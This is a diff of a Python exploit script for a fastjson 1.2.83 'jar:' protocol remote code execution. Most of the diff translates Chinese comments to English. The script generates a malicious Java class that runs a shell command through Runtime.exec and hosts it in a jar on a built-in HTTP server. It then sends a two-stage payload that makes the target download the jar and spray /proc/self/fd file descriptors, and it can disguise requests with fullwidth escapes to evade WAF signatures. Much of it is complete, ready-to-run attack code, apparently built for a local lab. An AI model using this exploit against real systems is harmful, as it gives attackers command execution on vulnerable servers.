@@ -1,33 +1,38 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-fastjson 1.2.83 `jar:` 协议 RCE —— 检测 + 完整复现 (单文件, 纯标准库 + requests/cryptography)
+fastjson 1.2.83 `jar:` protocol RCE — detection + full exploitation
+(single file, standard library + requests/cryptography)
 
-针对 fastjson 1.2.83 (autoType 默认关闭、无 safeMode) 借助 JVM 的 `jar:` 协议远程加载
-并执行任意类的利用链。提供两个子命令:
+Exploits fastjson 1.2.83 (autoType disabled by default, no safeMode) by abusing the
+JVM's `jar:` protocol to remotely load and instantiate an arbitrary class. Two subcommands:
 
-  * scan   —— 纯带外(OOB)检测: 只探测、不执行代码。用一个 jar:http:// 的 @type 迫使
-             目标在做任何类名校验前先把 jar 拉下来, 只要 interactsh 收到回连就判定存在漏洞。
-  * pwn    —— 完整复现(真正 RCE): 本机用纯 Python 生成一个 this_class 为 `jar:` URL 的
-             恶意类 (带 @JSONType 注解, 免 expectClass / 免继承), 打成 jar 并内置 HTTP 托管,
-             再发 stage-1(下载落地) + stage-2(/proc/self/fd 喷洒)完成命令执行。
+  * scan  — pure out-of-band (OOB) detection: only probes, never executes code. A
+            jar:http:// @type forces the target to download the jar before any class-name
+            validation; if interactsh receives the callback, the target is vulnerable.
+  * pwn   — full exploitation (real RCE): builds, in pure Python, a malicious class whose
+            this_class is a `jar:` URL (annotated with @JSONType, so no expectClass and no
+            inheritance are required), packs it into a jar and hosts it over a built-in HTTP
+            server, then sends stage-1 (download) + stage-2 (/proc/self/fd spray) to run a command.
 
-原理概览:
-  fastjson 的 checkAutoType 会对任意 @type 值先跑一次 @JSONType 探测 (getResourceAsStream)。
-  当 @type 是 `jar:http://<decIP>:<port>/<name>!/<entry>` 时, JVM 会在做任何类名校验 / loadClass
-  之前先通过 HTTP 把 jar 拉下来 —— 这一次 OOB 请求在各种 JDK/容器组合下都会触发, 因此 scan
-  只靠它做无害检测。要真正执行代码, 下载下来的 jar 会被缓存在 `/proc/self/fd/N`, 第二阶段用
-  `jar:file:/proc/self/fd/N!/<entry>N` (全单斜杠, 过 JDK9+ 的类名校验) 把恶意类 define 出来并
-  实例化, 触发 static 块 / 构造器里的 Runtime.exec。fastjson 把 `.` 替换成 `/` 去拼 URL, 所以
-  攻击者 IP 必须用无点的十进制整数形式。
+How it works:
+  While handling any @type, fastjson's checkAutoType first runs an @JSONType probe
+  (getResourceAsStream). When @type is `jar:http://<decIP>:<port>/<name>!/<entry>`, the JVM
+  opens that URL and downloads the jar over HTTP before any class-name validation / loadClass.
+  This OOB request fires across all JDK/container combinations, so `scan` relies on it for
+  harmless detection. To actually execute code, the downloaded jar is cached at `/proc/self/fd/N`;
+  stage-2 uses `jar:file:/proc/self/fd/N!/<entry>N` (all single-slash, passes class-name checks
+  on JDK 9+) to define and instantiate the malicious class, triggering the Runtime.exec in its
+  static block / constructor. Because fastjson replaces `.` with `/` when building the URL, the
+  attacker IP must be given as a dot-free decimal integer.
 
-依赖:
-  pip install requests cryptography      # cryptography 仅 scan/verify 需要
+Dependencies:
+  pip install requests cryptography      # cryptography is only needed by scan
 
-用法示例:
-  # 完整复现(两阶段, 通过 / 端点, 任意容器/JDK):
-  python3 poc.py pwn -t http://127.0.0.1:8090 -l <你的IP> -c 'id > /tmp/success'
-  # 纯带外检测:
+Examples:
+  # Full exploitation (two-stage, works on any container/JDK):
+  python3 poc.py pwn -t http://127.0.0.1:8090/ -l <your-ip> -c 'id > /tmp/success'
+  # Pure out-of-band detection:
   python3 poc.py scan -o http://203.0.113.10:50050 -t http://127.0.0.1:8090/
 """
 
@@ -48,14 +53,14 @@ from urllib.parse import urlparse
 
 import requests
 
-# 目标可能是自签名/过期证书的主机，忽略 TLS 校验；关闭对应告警。
+# Targets may use self-signed / expired certificates; skip TLS verification and silence the warning.
 requests.packages.urllib3.disable_warnings()  # type: ignore[attr-defined]
 
 VERSION = "2.0.0"
 
 
 # --------------------------------------------------------------------------- #
-# 彩色输出：非 TTY 或设置了 NO_COLOR 时自动关闭
+# Colored output: auto-disabled on non-TTY or when NO_COLOR is set
 # --------------------------------------------------------------------------- #
 def _enable_windows_ansi() -> None:
     if os.name == "nt":
@@ -96,7 +101,7 @@ def cyan(s: str) -> str:
 
 
 # --------------------------------------------------------------------------- #
-# 时间间隔解析：把 "8s"/"25s"/"500ms"/"1m30s" 之类解析为秒
+# Duration parsing: turn "8s"/"25s"/"500ms"/"1m30s" and the like into seconds
 # --------------------------------------------------------------------------- #
 _DUR_UNITS = {"ns": 1e-9, "us": 1e-6, "µs": 1e-6, "ms": 1e-3, "s": 1.0, "m": 60.0, "h": 3600.0}
 _DUR_RE = re.compile(r"(\d+(?:\.\d+)?)(ns|us|µs|ms|s|m|h)")
@@ -109,7 +114,7 @@ def parse_duration(text: str) -> float:
     matches = _DUR_RE.findall(s)
     if matches and "".join(a + b for a, b in matches) == s:
         return sum(float(val) * _DUR_UNITS[unit] for val, unit in matches)
-    try:  # 允许纯数字，按秒处理
+    try:  # allow a bare number, interpreted as seconds
         return float(s)
     except ValueError:
         raise argparse.ArgumentTypeError(f"invalid duration: {text!r}")
@@ -122,36 +127,37 @@ def _fmt_dur(seconds: float) -> str:
 
 
 # --------------------------------------------------------------------------- #
-# 随机小写字母数字串
+# Random lowercase alphanumeric string
 # --------------------------------------------------------------------------- #
 _ALNUM = "abcdefghijklmnopqrstuvwxyz0123456789"
 
 
 def rand_alnum(n: int) -> str:
-    # 小写很重要：服务器在匹配前会把 seen id 小写化，我们也用小写 key 轮询。
+    # Lowercase matters: the server lowercases seen ids before matching, so we poll with a lowercase key.
     return "".join(secrets.choice(_ALNUM) for _ in range(n))
 
 
-# 必须与服务器默认值一致 (pkg/settings): id 20 + nonce 13 = 33。
+# Must match the server defaults (pkg/settings): id 20 + nonce 13 = 33.
 CORRELATION_ID_LEN = 20
 NONCE_LEN = 13
 
 
 # --------------------------------------------------------------------------- #
-# IP / @type 工具 —— jar: 技巧要求攻击者 host 无点(十进制整数), 因为 fastjson 把 . 换成 /
+# IP / @type helpers — the jar: trick needs a dot-free host (decimal integer),
+# because fastjson replaces every `.` with `/`.
 # --------------------------------------------------------------------------- #
 def to_decimal_ip(host: str) -> str:
-    """点分 IPv4 -> 十进制整数字符串；已是纯数字则原样返回；否则抛 ValueError。"""
+    """Dotted-quad IPv4 -> decimal integer string; a pure-digit input is returned as-is; else raises ValueError."""
     if host.isdigit():
         return host
-    ip = ipaddress.ip_address(host)  # 抛 ValueError
+    ip = ipaddress.ip_address(host)  # raises ValueError
     if ip.version != 4:
         raise ValueError(f"not an IPv4 address: {host}")
     return str(int(ip))
 
 
 def decimal_host_port(base: str):
-    """把 http://1.2.3.4:8000 变成 ("16909060","8000")。"""
+    """Turn http://1.2.3.4:8000 into ("16909060", "8000")."""
     b = base
     for pre in ("http://", "https://"):
         if b.startswith(pre):
@@ -164,33 +170,33 @@ def decimal_host_port(base: str):
 
 
 def http_internal(dec_ip: str, port, name: str, entry: str) -> str:
-    """stage-1 类内部名 (斜杠形式): jar:http://<decIP>:<port>/<name>!/<entry>"""
+    """stage-1 class internal name (slash form): jar:http://<decIP>:<port>/<name>!/<entry>"""
     return f"jar:http://{dec_ip}:{port}/{name}!/{entry}"
 
 
 def file_internal(entry: str, n: int) -> str:
-    """stage-2 类内部名 (斜杠形式): jar:file:/proc/self/fd/<N>!/<entry>N"""
+    """stage-2 class internal name (slash form): jar:file:/proc/self/fd/<N>!/<entry>N"""
     return f"jar:file:/proc/self/fd/{n}!/{entry}{n}"
 
 
 def dot_type(slash_internal_name: str) -> str:
-    """斜杠 URL 内部名 -> fastjson @type 的点号形式 (fastjson 内部再 . -> /)。"""
+    """Slash-form URL internal name -> the dot form used in the fastjson @type (fastjson maps . -> / again)."""
     return slash_internal_name.replace("/", ".")
 
 
 # --------------------------------------------------------------------------- #
-# 纯 Python Java class 生成器 —— 无需 javac / ASM / fastjson jar
+# Pure-Python Java class generator — no javac / ASM / fastjson jar required
 #
-# 生成一个类:
-#   * this_class 内部名 = 传入的 `jar:` URL (斜杠形式), 与 @type 点号形式对应;
-#   * 类上带 @com.alibaba.fastjson.annotation.JSONType (checkAutoType 的 jsonType 分支放行,
-#     免 expectClass、免继承目标类);
-#   * <clinit> 与 <init> 都调用 run(), run() 执行 Runtime.getRuntime().exec({"/bin/sh","-c",cmd});
-#   * class 版本 50 (Java 6), 无分支 => 无需 StackMapTable, 在 JDK 8~21 均可加载。
-# JVM 不强制受检异常, 故省去 try/catch。
+# Emits a class where:
+#   * this_class internal name = the given `jar:` URL (slash form), matching the dot-form @type;
+#   * the class carries @com.alibaba.fastjson.annotation.JSONType (checkAutoType's jsonType branch
+#     passes it, so no expectClass and no inheritance from the target class are needed);
+#   * both <clinit> and <init> call run(), which runs Runtime.getRuntime().exec({"/bin/sh","-c",cmd});
+#   * class version 50 (Java 6), branchless => no StackMapTable, loadable on JDK 8~21.
+# The JVM does not enforce checked exceptions, so try/catch is omitted.
 # --------------------------------------------------------------------------- #
 class _CP:
-    """常量池构造器 (自动去重)。"""
+    """Constant-pool builder (with automatic de-duplication)."""
 
     def __init__(self):
         self.entries = []
@@ -200,7 +206,7 @@ class _CP:
         if key in self.cache:
             return self.cache[key]
         self.entries.append(raw)
-        idx = len(self.entries)  # 常量池索引从 1 开始
+        idx = len(self.entries)  # constant-pool indices start at 1
         self.cache[key] = idx
         return idx
 
@@ -281,10 +287,11 @@ def gen_class(internal_name: str, cmd: str) -> bytes:
     m_run = method(0x0008, run_n, void_d, code_attr(5, 0, run_code))
 
     # @JSONType(asm = false):
-    #   asm=false 迫使 fastjson 用反射反序列化器 (clazz.newInstance()) 而不是 ASM 生成的
-    #   deserializer。ASM 版 createInstance 会用 `new <jar:URL 名>()` 按名字在 ASMClassLoader
-    #   里重新解析这个畸形类名 -> ClassNotFoundException -> NoClassDefFoundError, <clinit> 不触发;
-    #   反射版直接在已解析好的 Class 对象上 newInstance -> 初始化 -> <clinit> -> 命令执行。
+    #   asm=false forces fastjson to use the reflection deserializer (clazz.newInstance()) instead of
+    #   its ASM-generated one. The ASM createInstance would do `new <jar:URL name>()`, re-resolving this
+    #   bizarre class name through ASMClassLoader -> ClassNotFoundException -> NoClassDefFoundError, so
+    #   <clinit> never runs; the reflection path calls newInstance on the already-resolved Class object,
+    #   initializing it -> <clinit> -> command execution.
     annotation = (struct.pack(">H", ann_type) + struct.pack(">H", 1)      # type, 1 element pair
                   + struct.pack(">H", asm_name) + b"Z" + struct.pack(">H", false_int))  # asm = (boolean)0
     class_ann = (struct.pack(">H", rva) + struct.pack(">I", 2 + len(annotation))
@@ -305,7 +312,7 @@ def gen_class(internal_name: str, cmd: str) -> bytes:
 
 
 def _jar_bytes(entries) -> bytes:
-    """把 {name: class_bytes} 打成一个 (无压缩) jar/zip。"""
+    """Pack {name: class_bytes} into an (uncompressed) jar/zip."""
     import io
     import zipfile
 
@@ -318,9 +325,9 @@ def _jar_bytes(entries) -> bytes:
 
 def build_probe_jar(dec_ip: str, port, name: str, entry: str, cmd: str,
                     spray: bool, fd_low: int, fd_high: int) -> bytes:
-    """生成 probe jar:
-       - stage-1 条目 <entry>.class, 内部名 = jar:http URL (触发下载);
-       - spray 模式再追加 <entry>N.class, 内部名 = jar:file:/proc/self/fd/N!/<entry>N。
+    """Build the probe jar:
+       - stage-1 entry <entry>.class, internal name = jar:http URL (triggers the download);
+       - in spray mode, also append <entry>N.class, internal name = jar:file:/proc/self/fd/N!/<entry>N.
     """
     entries = {entry + ".class": gen_class(http_internal(dec_ip, port, name, entry), cmd)}
     if spray:
@@ -330,7 +337,7 @@ def build_probe_jar(dec_ip: str, port, name: str, entry: str, cmd: str,
 
 
 # --------------------------------------------------------------------------- #
-# 内置 HTTP 服务 —— 任意路径都返回同一个 probe jar
+# Built-in HTTP server — returns the same probe jar for any path
 # --------------------------------------------------------------------------- #
 class _JarServer(socketserver.ThreadingTCPServer):
     allow_reuse_address = True
@@ -353,7 +360,7 @@ def serve_jar(port: int, jar: bytes, verbose: bool) -> _JarServer:
                       f"{self.client_address[0]} GET {self.path}")
 
         def log_message(self, *args):
-            pass  # 静默默认访问日志
+            pass  # silence the default access log
 
     httpd = _JarServer(("0.0.0.0", port), Handler)
     threading.Thread(target=httpd.serve_forever, daemon=True).start()
@@ -361,34 +368,34 @@ def serve_jar(port: int, jar: bytes, verbose: bool) -> _JarServer:
 
 
 # --------------------------------------------------------------------------- #
-# interactsh 客户端 (OOB 检测)
+# interactsh client (OOB detection)
 # --------------------------------------------------------------------------- #
 class InteractshError(Exception):
     pass
 
 
 class InteractshClient:
-    """精简版 interactsh 客户端：注册、轮询、解密 HTTP 交互 (基于路径关联)。"""
+    """Minimal interactsh client: register, poll, and decrypt HTTP interactions (path-based correlation)."""
 
     def __init__(self, oob_url: str, timeout: float):
         u = urlparse(oob_url)
         if not u.scheme or not u.netloc:
             raise InteractshError(f"invalid oob url {oob_url!r}")
         self.base = f"{u.scheme}://{u.netloc}"
-        self.corr_id = rand_alnum(CORRELATION_ID_LEN)  # 20 位，轮询 key
+        self.corr_id = rand_alnum(CORRELATION_ID_LEN)  # 20 chars, the polling key
         self.secret = rand_alnum(32)
         from cryptography.hazmat.primitives.asymmetric import rsa
         self.priv = rsa.generate_private_key(public_exponent=65537, key_size=2048)
         self.timeout = timeout
-        self.session = requests.Session()  # 与目标流量分开，不走代理
+        self.session = requests.Session()  # kept separate from target traffic; never proxied
 
     def new_name(self) -> str:
-        """返回 `<correlationID><fresh-nonce>` —— 33 字符 token，嵌入 payload 路径。"""
+        """Return `<correlationID><fresh-nonce>` — a 33-char token embedded in the payload path."""
         return self.corr_id + rand_alnum(NONCE_LEN)
 
     def _encode_public_key(self) -> str:
         from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
-        # 服务器给 PEM 块起名 "RSA PUBLIC KEY"，但里面存的是 PKIX(SubjectPublicKeyInfo) 字节。
+        # The server labels the PEM block "RSA PUBLIC KEY" but stores PKIX (SubjectPublicKeyInfo) bytes.
         der = self.priv.public_key().public_bytes(Encoding.DER, PublicFormat.SubjectPublicKeyInfo)
         b64 = base64.b64encode(der).decode("ascii")
         lines = [b64[i: i + 64] for i in range(0, len(b64), 64)]
@@ -430,14 +437,14 @@ class InteractshClient:
             try:
                 plain = self._decrypt(aes_key, d)
             except Exception:
-                continue  # 单条坏数据不应拖垮整批
+                continue  # one bad record must not drop the whole batch
             try:
                 it = json.loads(plain.strip())
             except (ValueError, UnicodeDecodeError):
                 continue
             if isinstance(it, dict):
                 out.append(it)
-        # extra / tlddata 是明文 JSON
+        # extra / tlddata are plaintext JSON
         for s in (pr.get("extra") or []) + (pr.get("tlddata") or []):
             if not s:
                 continue
@@ -460,7 +467,7 @@ class InteractshClient:
             pass
 
     def _decrypt(self, aes_key_b64: str, msg_b64: str) -> bytes:
-        # 逆向服务器的 AES-256-CTR-over-RSA-OAEP(SHA256) 方案。
+        # Reverse the server's AES-256-CTR-over-RSA-OAEP(SHA256) scheme.
         from cryptography.hazmat.primitives import hashes
         from cryptography.hazmat.primitives.asymmetric import padding
         from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
@@ -479,17 +486,17 @@ class InteractshClient:
 
 
 # --------------------------------------------------------------------------- #
-# Ghost Bits：用全角字符做 \u 编码来绕过签名 WAF
+# Ghost Bits: \u-escape with fullwidth glyphs to evade signature-based WAFs
 # --------------------------------------------------------------------------- #
 def ghost_hex_digit(n: int) -> str:
-    # 全角数字 ０-９ (U+FF10) 表示 0-9，全角字母 ａ-ｆ (U+FF41) 表示 10-15。
+    # Fullwidth digits ０-９ (U+FF10) stand for 0-9; fullwidth letters ａ-ｆ (U+FF41) stand for 10-15.
     if n < 10:
         return chr(0xFF10 + n)
     return chr(0xFF41 + (n - 10))
 
 
 def ghost_escape(s: str) -> str:
-    # 把每个字符编码成 \u + 四个全角十六进制字形。仅绕过签名匹配，绕不过 safeMode。
+    # Encode each char as \u + four fullwidth hex glyphs. Only evades signature matching, not safeMode.
     out = []
     for ch in s:
         code = ord(ch)
@@ -500,7 +507,7 @@ def ghost_escape(s: str) -> str:
 
 
 def build_body(at_type: str, ghost: bool) -> bytes:
-    """构造要发送的 JSON body：`{"@type":"<at_type>","x":1}`；ghost 模式 key 与值都用 \\u 全角编码。"""
+    """Build the JSON body to send: `{"@type":"<at_type>","x":1}`; in ghost mode the key and value are \\u fullwidth-encoded."""
     if ghost:
         key = ghost_escape("@type")
         val = ghost_escape(at_type)
@@ -511,7 +518,7 @@ def build_body(at_type: str, ghost: bool) -> bytes:
 
 
 def parse_proxy(s: str):
-    """把代理字符串规范化。裸 host:port 默认 http；显式 http/https 透传。"""
+    """Normalize a proxy string. A bare host:port defaults to http; explicit http/https is passed through."""
     if "://" not in s:
         s = "http://" + s
     u = urlparse(s)
@@ -521,7 +528,7 @@ def parse_proxy(s: str):
 
 
 # --------------------------------------------------------------------------- #
-# 小工具
+# Small helpers
 # --------------------------------------------------------------------------- #
 def clip(s: str, n: int) -> str:
     if len(s) <= n:
@@ -555,7 +562,7 @@ def load_targets(single, file):
 
 
 def parse_headers(items):
-    """把重复的 `-H "Name: Value"` 解析为 dict —— 用于携带 Cookie/Authorization 等头。"""
+    """Parse repeated `-H "Name: Value"` into a dict — for carrying Cookie/Authorization etc."""
     headers = {}
     for raw in items or []:
         name, sep, value = raw.partition(":")
@@ -566,10 +573,6 @@ def parse_headers(items):
     return headers
 
 
-def join_url(target: str, endpoint: str) -> str:
-    return target.rstrip("/") + (endpoint if endpoint.startswith("/") else "/" + endpoint)
-
-
 def http_post(session, url, body, headers, timeout, proxies):
     hdrs = {"Content-Type": "application/json"}
     hdrs.update(headers or {})
@@ -578,7 +581,7 @@ def http_post(session, url, body, headers, timeout, proxies):
 
 
 # --------------------------------------------------------------------------- #
-# scan：纯带外检测 (只探测、不执行)
+# scan: pure out-of-band detection (probe only, no execution)
 # --------------------------------------------------------------------------- #
 def send_probe(session, url, body, headers, timeout, proxies, verbose):
     try:
@@ -610,7 +613,7 @@ def run_scan(cfg) -> int:
             print(f"{cyan('[*]')} target traffic via proxy {norm}")
         target_session = requests.Session()
 
-        tasks = {}   # name -> 目标 URL
+        tasks = {}   # name -> target URL
         labels = []
         for tgt in cfg["targets"]:
             name = c.new_name()
@@ -666,58 +669,63 @@ def run_scan(cfg) -> int:
 
 
 # --------------------------------------------------------------------------- #
-# pwn：完整复现 (真正执行命令)
+# pwn: full exploitation (actually runs the command)
 # --------------------------------------------------------------------------- #
 def run_pwn(cfg) -> int:
     try:
         dec_ip = to_decimal_ip(cfg["lhost"])
     except ValueError as e:
-        print(f"{red('error:')} lhost 必须是点分 IPv4 或十进制整数 "
-              f"(含字母的主机名会因 jar: 技巧把点替换成斜杠而失效): {e}", file=sys.stderr)
+        print(f"{red('error:')} lhost must be a dotted-quad IPv4 or a decimal integer "
+              f"(a hostname with letters breaks the jar: trick, which turns dots into slashes): {e}",
+              file=sys.stderr)
         return 2
     if dec_ip != cfg["lhost"]:
-        print(f"{cyan('[*]')} lhost {cfg['lhost']} -> 十进制 {dec_ip}")
+        print(f"{cyan('[*]')} lhost {cfg['lhost']} -> decimal {dec_ip}")
 
-    # fastjson 用静态全局 mappings 缓存已加载的类 (键=@type 字符串)。为避免对同一个
-    # 未重启的 JVM 反复打靶时命中上一轮的旧类 (旧命令), 每次运行给 entry 追加随机后缀,
-    # 使 stage-1/stage-2 的 @type 都唯一。用户显式指定 --entry 时尊重其取值。
+    # fastjson caches loaded classes in a static global `mappings` (keyed by the @type string). To avoid
+    # hitting a stale class (old command) from a previous run against a JVM that was not restarted, each
+    # run appends a random suffix to `entry` so the stage-1/stage-2 @type values are unique. An explicit
+    # --entry is respected.
     entry = cfg["entry"] or ("POC" + rand_alnum(4))
     cfg["entry"] = entry
-    url = join_url(cfg["target"], cfg["endpoint"])
+    url = cfg["target"]
     jar = build_probe_jar(dec_ip, cfg["lport"], cfg["name"], cfg["entry"], cfg["cmd"],
                           True, cfg["fd_low"], cfg["fd_high"])
-    print(f"{green('[+]')} 构建 probe jar: {len(jar)} bytes, "
-          f"spray {cfg['fd_high'] - cfg['fd_low']} fd 类, cmd=[{cfg['cmd']}]")
+    print(f"{green('[+]')} built probe jar: {len(jar)} bytes, "
+          f"spray {cfg['fd_high'] - cfg['fd_low']} fd classes, cmd=[{cfg['cmd']}]")
 
     try:
         httpd = serve_jar(cfg["lport"], jar, cfg["verbose"])
     except OSError as e:
-        print(f"{red('error:')} 无法监听 0.0.0.0:{cfg['lport']}: {e}", file=sys.stderr)
+        print(f"{red('error:')} cannot listen on 0.0.0.0:{cfg['lport']}: {e}", file=sys.stderr)
         return 2
-    print(f"{green('[+]')} 内置 HTTP 托管 0.0.0.0:{cfg['lport']} (任意路径返回该 jar)")
+    print(f"{green('[+]')} hosting jar on 0.0.0.0:{cfg['lport']} (any path returns this jar)")
 
     session = requests.Session()
     timeout = cfg["timeout"]
     try:
-        # ---------- stage 1: 触发下载落地 ----------
+        # ---------- stage 1: trigger the download ----------
         http_dot = dot_type(http_internal(dec_ip, cfg["lport"], cfg["name"], cfg["entry"]))
-        print(f"{cyan('[*]')} STAGE 1 -> {url}  下载 {http_dot}")
+        print(f"{cyan('[*]')} STAGE 1 -> {url}  downloading {http_dot}")
         try:
             r1 = http_post(session, url, build_body(http_dot, cfg["ghost"]), cfg["headers"], timeout, None)
-            print(f"{cyan('[*]')}   响应 {r1.status_code} {snippet(r1.text)}")
+            print(f"{cyan('[*]')}   response {r1.status_code} {snippet(r1.text)}")
         except requests.RequestException as e:
-            print(f"{yellow('[!]')}   stage1 请求异常 (下载副作用可能已发生): {e}")
+            print(f"{yellow('[!]')}   stage1 request error (the download side effect may still have happened): {e}")
 
-        # ---------- stage 2: /proc/self/fd 盲喷 ----------
-        # stage-1 下载的 jar 被 URLClassLoader 缓存在某个 `/tmp/jar_cache*.tmp (deleted)`,
-        # 对应一个 /proc/self/fd/N。我们并不知道 N (本环境实测 ~33), 于是遍历一段 fd 区间,
-        # 用 jar:file:/proc/self/fd/N!/<entry>N (全单斜杠, 过各 JDK 类名校验) 逐个尝试; 命中真正
-        # 那个 N 时, 恶意类被 define + 实例化 -> static/<init> 执行命令。
-        # 注意: 命中与否无法靠 HTTP 响应判定 —— 像 @RequestBody User 这类带 expectClass 的入口,
-        # 命令虽已执行, 返回对象却因不是目标 bean 而报错; 因此这是一次“盲打”, 结果需带外核验。
+        # ---------- stage 2: /proc/self/fd blind spray ----------
+        # The jar downloaded in stage 1 is cached by URLClassLoader as a `/tmp/jar_cache*.tmp (deleted)`
+        # file, exposed as some /proc/self/fd/N. We do not know N (observed ~33 in this environment), so we
+        # walk a range of fds, trying jar:file:/proc/self/fd/N!/<entry>N (all single-slash, passes class-name
+        # checks on every JDK) one by one; hitting the real N defines + instantiates the malicious class ->
+        # static/<init> runs the command.
+        # Note: a hit cannot be told from the HTTP response — with an expectClass entry like @RequestBody User,
+        # the command runs but the returned object is not the expected bean and errors out. So this is a blind
+        # spray whose result must be verified out of band.
         lo, hi = cfg["fd_low"], cfg["fd_high"]
-        print(f"{cyan('[*]')} STAGE 2 -> 遍历 fd [{lo},{hi}) 盲打 "
-              f"(下载的 jar 缓存于某个 /proc/self/fd/N, 命中即 define+实例化恶意类 -> 执行命令)")
+        print(f"{cyan('[*]')} STAGE 2 -> spraying fd [{lo},{hi}) blindly "
+              f"(the downloaded jar is cached at some /proc/self/fd/N; hitting it defines+instantiates "
+              f"the malicious class -> runs the command)")
         total = hi - lo
         for i, n in enumerate(range(lo, hi), 1):
             file_dot = dot_type(file_internal(cfg["entry"], n))
@@ -730,17 +738,17 @@ def run_pwn(cfg) -> int:
                 sys.stdout.flush()
         if USE_COLOR:
             sys.stdout.write("\n")
-        print(f"{green('[+]')} STAGE 2 完成: 已向 fd [{lo},{hi}) 盲发 stage-2 请求, "
-              f"若目标存在漏洞, 命令 [{cfg['cmd']}] 已在目标执行")
-        print(f"{cyan('[*]')} 请带外核验执行结果 "
-              f"(本环境示例可在容器内 `docker compose exec web cat /tmp/success`)")
+        print(f"{green('[+]')} STAGE 2 done: sprayed stage-2 requests over fd [{lo},{hi}); "
+              f"if the target is vulnerable, the command [{cfg['cmd']}] has run on it")
+        print(f"{cyan('[*]')} verify the result out of band "
+              f"(for this environment: `docker compose exec web cat /tmp/success`)")
         return 0
     finally:
         httpd.shutdown()
 
 
 # --------------------------------------------------------------------------- #
-# 命令实现
+# Command implementations
 # --------------------------------------------------------------------------- #
 def cmd_scan(args) -> int:
     targets = load_targets(args.target, args.file)
@@ -765,7 +773,7 @@ def cmd_scan(args) -> int:
     except (OSError, ValueError) as e:
         print(f"{red('error:')} {e}", file=sys.stderr)
         return 1
-    return 1 if vuln > 0 else 0  # 有命中则非零，便于 CI/脚本标记
+    return 1 if vuln > 0 else 0  # non-zero when something is vulnerable, handy for CI/scripts
 
 
 def cmd_pwn(args) -> int:
@@ -775,10 +783,10 @@ def cmd_pwn(args) -> int:
         print(f"{red('error:')} {e}", file=sys.stderr)
         return 2
     if args.fd_low < 0 or args.fd_high <= args.fd_low:
-        print(f"{red('error:')} fd 范围非法: [{args.fd_low},{args.fd_high})", file=sys.stderr)
+        print(f"{red('error:')} invalid fd range: [{args.fd_low},{args.fd_high})", file=sys.stderr)
         return 2
     cfg = {
-        "target": args.target, "endpoint": args.endpoint, "lhost": args.lhost,
+        "target": args.target, "lhost": args.lhost,
         "lport": args.lport, "name": args.name, "entry": args.entry, "cmd": args.cmd,
         "ghost": args.ghost, "headers": headers,
         "fd_low": args.fd_low, "fd_high": args.fd_high, "timeout": args.timeout,
@@ -800,15 +808,16 @@ def build_parser() -> argparse.ArgumentParser:
 
     env_oob = os.environ.get("OOB_URL")
 
-    # ---- pwn (完整复现) ----
+    # ---- pwn (full exploitation) ----
     w = sub.add_parser("pwn", aliases=["p"],
                        help="full exploit: build a jar:-named class, host it, and run a command via RCE")
-    w.add_argument("-t", "--target", required=True, help="target base URL, e.g. http://127.0.0.1:8090")
-    w.add_argument("-e", "--endpoint", default="/",
-                   help="deserialization endpoint path (default /)")
+    w.add_argument("-t", "--target", required=True,
+                   help="full target URL incl. path, e.g. http://127.0.0.1:8090/")
     w.add_argument("-l", "--lhost", default="127.0.0.1",
                    help="attacker HTTP host, dotted-quad or decimal (must be reachable by target)")
-    w.add_argument("-p", "--lport", type=int, default=8000, help="attacker HTTP port (default 8000)")
+    w.add_argument("-p", "--lport", type=int, default=8000,
+                   help="attacker HTTP port; the script starts a built-in HTTP server on this port to "
+                        "host the jar (default 8000)")
     w.add_argument("-c", "--cmd", default="id > /tmp/success",
                    help="command to run via /bin/sh -c (default: id > /tmp/success)")
     w.add_argument("--name", default="probe", help="jar URL path / filename (default probe)")
@@ -826,7 +835,7 @@ def build_parser() -> argparse.ArgumentParser:
     w.add_argument("-v", "--verbose", action="store_true", help="print jar-fetch and extra logs")
     w.set_defaults(func=cmd_pwn)
 
-    # ---- scan (OOB 检测) ----
+    # ---- scan (OOB detection) ----
     p = sub.add_parser("scan", aliases=["s"],
                        help="probe targets out-of-band and report which are vulnerable (detect only)")
     p.add_argument("-o", "--oob", default=env_oob, required=env_oob is None,
